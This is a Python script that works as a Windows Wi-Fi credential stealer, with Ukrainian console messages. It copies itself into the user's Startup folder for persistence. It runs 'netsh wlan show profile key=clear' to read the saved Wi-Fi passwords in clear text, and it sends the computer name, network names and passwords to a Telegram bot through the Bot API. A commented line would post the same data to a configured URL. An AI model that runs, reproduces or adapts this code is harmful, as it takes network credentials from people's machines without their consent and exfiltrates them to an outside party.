import re
import subprocess
import os
from struct import *
import requests
import winshell
import time
import socket
import shutil
import config
import sys



def copyFile(src,dst):
    try:
        shutil.copy(src,dst)
    except shutil.Error as e:
        print('Error: %s' % e)
    except IOError as e:
        print('Error: %s' % e.strerror)

class Wifier:
    def sendmsg(bot_token,chtid,msgtext):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {
            "chat_id": chtid,
            "text": msgtext,
        }
        requests.get(url, params=params)
        
        
    def extract_wifi_passwords():
        bssid = subprocess.check_output("chcp 65001 | arp -a", shell=True)
        bssid=bssid.rstrip(b'\x00').decode("utf_8")
        s=bssid.split('\n')
        for line in s:
            res=re.search('(?:[0-9a-f]{2}-){5}[0-9a-f]{2}',line)
            if res:
                bssid=res.group(0)
                break

        proc = subprocess.check_output("chcp 65001 | netsh wlan show profiles", shell=True)
        proc=proc.rstrip(b'\x00').decode("utf_8")
        s=proc.split('\n')
        
        essidlist=[]
        for line in s:
            res=re.search(r'\s+:\s(\S+)',line)
            if res:
                essid=res.group(1)
                print('essid: ',essid)
                essidlist.append(essid)
        for profile in essidlist:
            profile_info=subprocess.check_output(f'chcp 65001 | netsh wlan show profile {profile} key=clear', shell=True)
            profile_info=profile_info.rstrip(b'\x00').decode("utf_8")
            profile_info=str(profile_info).split('\n')
            password=None
            for line in profile_info:
                result=re.search(r'Key Content\s+:\s(\S+)',line)
                if result:
                    password=result.group(1)
            if password!=None:
                print(f'Password for essid:{profile} {password}')
            else:
                print(f'There is no password for essid:{profile}')
                password=''
            flag=0
            compname=socket.gethostname()
            fname=f'wilog_{compname}.log'
            os.popen(f'netsh wlan export profile name={profile} folder=".\" key=clear')
            if os.path.exists(fname):
                print(f'File {fname} exists')
                with open(file=fname,mode='r',encoding='utf-8') as filer:
                    lines=filer.readlines()
                    for line in lines:
                        if f"essid:{profile}" in line:
                            if line[:-1].endswith(password):
                                flag=1
                                print('Пароль той самий')
                            else:
                                flag=2
                                print(f'Пароль змінився на {password}')
            if flag in [0,2]:
                with open(file=fname,mode='a',encoding='utf-8') as file:
                    file.write(f'Password for essid:{profile} {password}\n')
                try:
                    print('Закачаємо на сервер')
                    compname=os.environ['COMPUTERNAME']
                    Wifier.sendmsg(config.WIFI_BOT_TOKEN,config.CHTID,f"COMPUTERNAME:{compname} {bssid} {profile} password:{password}")
                    # post_request = requests.post(config.URL, {'compname':f"COMPUTERNAME:{compname} BSSID:{bssid}",'ESSID':f"{profile}",'passwd':password})
                    # print(post_request.text)
                except:
                    print('[-]Нажаль не вдалося закачати на сервер!!!')

def main():
    if os.name == 'nt':
        fname=sys.argv[0]
        Fname=fname.split('\\')[-1]
        startup = winshell.startup()
        newScripFName=startup+'\\'+Fname
        copyFile(fname,newScripFName)
        Wifier.extract_wifi_passwords()

    
if __name__=='__main__':
    main()
